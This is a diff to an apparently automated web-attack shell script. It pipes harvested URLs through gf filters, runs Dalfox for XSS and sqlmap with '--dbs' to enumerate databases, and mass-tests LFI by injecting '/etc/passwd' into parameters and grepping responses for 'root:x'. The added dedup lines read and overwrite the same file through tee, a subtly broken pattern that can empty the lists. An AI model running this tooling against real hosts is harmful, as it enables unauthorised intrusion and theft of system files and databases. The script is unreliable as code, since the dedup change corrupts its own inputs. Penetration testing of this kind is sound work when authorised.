@@ -105,16 +105,24 @@ then
 fi
 
 # Extract urls with possible XSS params
-cat live_urls_$HOST.txt | $QSREPLACE -a | $GF xss > xss_urls_$HOST.txt
+cat live_urls_$HOST.txt | $GF xss > xss_urls_$HOST.txt
+# Remove duplicates
+cat xss_urls_$HOST.txt | $QSREPLACE -a | tee xss_urls_$HOST.txt
 
 # Extract urls with possible SQLi params
-cat live_urls_$HOST.txt | $QSREPLACE -a | $GF sqli > sqli_urls_$HOST.txt
+cat live_urls_$HOST.txt | $GF sqli > sqli_urls_$HOST.txt
+# Remove duplicates
+cat sqli_urls_$HOST.txt | $QSREPLACE -a | tee sqli_urls_$HOST.txt
 
 # Extract urls with possible LFI params
-cat live_urls_$HOST.txt | $QSREPLACE -a | $GF lfi > lfi_urls_$HOST.txt
+cat live_urls_$HOST.txt | $GF lfi > lfi_urls_$HOST.txt
+# Remove duplicates
+cat lfi_urls_$HOST.txt | $QSREPLACE -a | tee lfi_urls_$HOST.txt
 
 # Extract urls with possible SSRF params
-cat live_urls_$HOST.txt | $QSREPLACE -a | $GF ssrf > ssrf_urls_$HOST.txt
+cat live_urls_$HOST.txt | $GF ssrf > ssrf_urls_$HOST.txt
+# Remove duplicates
+cat ssrf_urls_$HOST.txt | $QSREPLACE -a | tee ssrf_urls_$HOST.txt
 
 # Run Dalfox on XSS urls
 echo "Running DALFOX.."
@@ -122,7 +130,6 @@ $DALFOX file xss_urls_$HOST.txt -w 10 -S -o dalfox_XSS_$HOST.txt
 
 # Run SQLMAP on SQLi urls
 $SQLMAP -m sqli_urls_$HOST.txt --batch --random-agent --dbs -o sqlmap_$HOST
-
 
 # Test basic LFI vulnerability
 cat lfi_urls_$HOST.txt | $QSREPLACE "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -sk "%" 2>&1 | grep -q "root:x" && echo "VULNERABLE! %"' | tee lfi_vulnerable_urls_$HOST.txt
